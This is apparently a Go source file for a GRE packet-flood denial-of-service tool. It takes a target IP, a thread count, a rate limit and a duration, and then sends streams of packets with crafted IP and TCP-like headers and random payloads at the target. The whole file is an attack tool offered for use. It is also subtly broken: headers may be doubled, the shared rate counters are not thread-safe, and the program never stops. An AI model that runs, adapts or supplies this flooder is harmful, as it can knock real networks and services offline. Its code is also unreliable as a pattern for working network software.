package main

import (
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"os"
	"strconv"
	"sync"
	"time"
)

const (
	MAX_PACKET_SIZE = 65535
	PHI             = 0x9e3779b9
	GRE_PROTOCOL    = 47
)

var (
	limiter   int
	pps       int
	sleeptime = 100 * time.Millisecond
	wg        sync.WaitGroup
)

type PseudoHeader struct {
	SrcAddr   uint32
	DstAddr   uint32
	Zero      uint8
	Proto     uint8
	TcpLength uint16
}

func main() {
	if len(os.Args) < 5 {
		fmt.Println("Usage: go run <target IP> <number of threads> <pps limiter, -1 for no limit> <time in seconds>")
		return
	}

	targetIP := os.Args[1]
	numThreads := atoi(os.Args[2])
	maxPps := atoi(os.Args[3])
	duration := atoi(os.Args[4]) * 1000

	fmt.Println("sockets should be setup ! ")
	addr, err := net.ResolveIPAddr("ip4", targetIP)
	if err != nil {
		fmt.Println("Error resolving target IP:", err)
		return
	}

	for i := 0; i < numThreads; i++ {
		wg.Add(1)
		go flood(addr, maxPps)
	}

	go func() {
		ticker := time.NewTicker(sleeptime)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				if limiter > 0 {
					limiter--
				} else {
					sleeptime = 100 * time.Millisecond
				}
				pps = 0
			}
		}
	}()

	time.Sleep(time.Duration(duration) * time.Millisecond)
	wg.Wait()
}

func createIPHeader(target *net.IPAddr) []byte {
	buf := make([]byte, 20)
	buf[0] = 0x45
	buf[1] = 0
	binary.BigEndian.PutUint16(buf[2:4], uint16(20+20))
	binary.BigEndian.PutUint16(buf[4:6], 54321)
	buf[6] = 0
	buf[7] = 64
	buf[8] = GRE_PROTOCOL
	binary.BigEndian.PutUint32(buf[12:16], 0)
	copy(buf[16:20], target.IP)

	binary.BigEndian.PutUint16(buf[10:12], checksum(buf))
	return buf
}

func flood(target *net.IPAddr, maxPps int) {
	defer wg.Done()
	conn, err := net.Dial("ip4:gre", target.String())
	if err != nil {
		fmt.Println("Could not open raw socket:", err)
		return
	}
	defer conn.Close()

	for {
		datagram := make([]byte, MAX_PACKET_SIZE)
		ipHeader := createIPHeader(target)
		tcpHeader := createTCPHeader()

		copy(datagram[0:20], ipHeader)
		copy(datagram[20:40], tcpHeader)

		payloadSize := 1400
		payload := make([]byte, payloadSize)
		rand.Read(payload)
		copy(datagram[40:], payload)

		_, err := conn.Write(datagram[:40+payloadSize])
		if err != nil {
			fmt.Println("Failed to send packet:", err)
			return
		}

		pps++

		if pps > maxPps && maxPps != -1 {
			sleeptime += 100 * time.Millisecond
		} else {
			if sleeptime > 25*time.Millisecond {
				sleeptime -= 25 * time.Millisecond
			} else {
				sleeptime = 0
			}
		}
		time.Sleep(sleeptime)
	}
}

func createTCPHeader() []byte {
	buf := make([]byte, 20)
	binary.BigEndian.PutUint16(buf[0:2], uint16(rand.Intn(65535)))
	binary.BigEndian.PutUint32(buf[4:8], uint32(rand.Intn(1<<32)))
	binary.BigEndian.PutUint32(buf[8:12], uint32(rand.Intn(1<<32)))
	buf[12] = 0x50
	buf[13] = 0x18
	binary.BigEndian.PutUint16(buf[14:16], 65535)
	binary.BigEndian.PutUint16(buf[16:18], 0)
	binary.BigEndian.PutUint16(buf[18:20], 0)

	pseudoHeader := PseudoHeader{
		SrcAddr:   0,
		DstAddr:   0,
		Zero:      0,
		Proto:     GRE_PROTOCOL,
		TcpLength: uint16(len(buf)),
	}

	checksumBytes := append(pseudoHeaderToBytes(pseudoHeader), buf...)
	binary.BigEndian.PutUint16(buf[16:18], checksum(checksumBytes))

	return buf
}

func pseudoHeaderToBytes(ph PseudoHeader) []byte {
	buf := make([]byte, 12)
	binary.BigEndian.PutUint32(buf[0:4], ph.SrcAddr)
	binary.BigEndian.PutUint32(buf[4:8], ph.DstAddr)
	buf[8] = ph.Zero
	buf[9] = ph.Proto
	binary.BigEndian.PutUint16(buf[10:12], ph.TcpLength)
	return buf
}

func checksum(data []byte) uint16 {
	var sum uint32
	for i := 0; i < len(data)-1; i += 2 {
		sum += uint32(data[i])<<8 + uint32(data[i+1])
	}
	if len(data)%2 != 0 {
		sum += uint32(data[len(data)-1]) << 8
	}
	sum = (sum >> 16) + (sum & 0xffff)
	return uint16(^sum)
}

func atoi(str string) int {
	val, err := strconv.Atoi(str)
	if err != nil {
		fmt.Println("Invalid integer:", str)
		return 0
	}
	return val
}
